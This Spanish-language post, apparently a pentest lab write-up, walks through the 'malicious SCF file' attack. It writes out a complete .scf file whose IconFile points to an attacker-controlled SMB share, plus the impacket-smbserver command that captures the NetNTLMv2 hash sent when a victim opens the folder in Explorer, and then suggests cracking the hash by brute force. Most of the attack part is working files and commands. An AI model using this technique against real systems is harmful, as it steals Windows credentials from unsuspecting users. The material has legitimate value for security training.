---
title: "SCF malicious File"
author: Tuch0
date: 2023-09-17
categories: [Vectores-de-Ataque]
tags: [scf]
image:
    path: ../../assets/Miniaturas/VectoresDeAtaque/scf.webp
    width: 800
    height: 500
---


> SCF (Shell Command Files) Lo que ocurre realializando este ataque es que cuando nosotros subimos nuestro archivo malicioso a un servidor y tratan de abrirlo desde el explorador de archivos , lo que estamos haciendo es que nuestro archivo que hemos creado tiene un icono que reside en un archivo de nuestra máquina local compartido a nivel de red por SMB por lo tanto cuando traten de abrir el archivo , como este esta compartido por smb, por detrás viaja una autenticación a nivel de red y nosotros la conseguimos capturar
{: .prompt-info }

# Escenario

![](../../assets/VectoresDeAtaque/SCF-malicious-File/1.jpg)

> Nos esta diciendo que cuando subamos nuestro "firmware" , el equipo de testeo lo va a revisar de forma manual , por lo tanto nos esta diciendo que va a abrir nuestro archivo , lo mas probable que desde el explorador de archivos
{: .prompt-info }


## Creamos el archivo malicioso

```shell
[SHELL]
Command=2
IconFile=\\<ip_local>\<local_share_folder>\pentestlab.ico
[Taskbar]
Command=ToogleDesktop
```


## Creamos un servidor

```shell
# Iniciamos el servidor por SMB
impacket-smbserver smbFolder $(pwd) -smb2support
```

## Ataque

![](../../assets/VectoresDeAtaque/SCF-malicious-File/2.jpg)

> Ahora es cuando recibimos el HashNetNTLMv2 una vez que abran el archivo
{: .prompt-info }

![](../../assets/VectoresDeAtaque/SCF-malicious-File/3.jpg)

> Ahora lo podriamos tratar de romper por fuerza bruta
{: .prompt-info }

![](../../assets/VectoresDeAtaque/SCF-malicious-File/4.jpg)
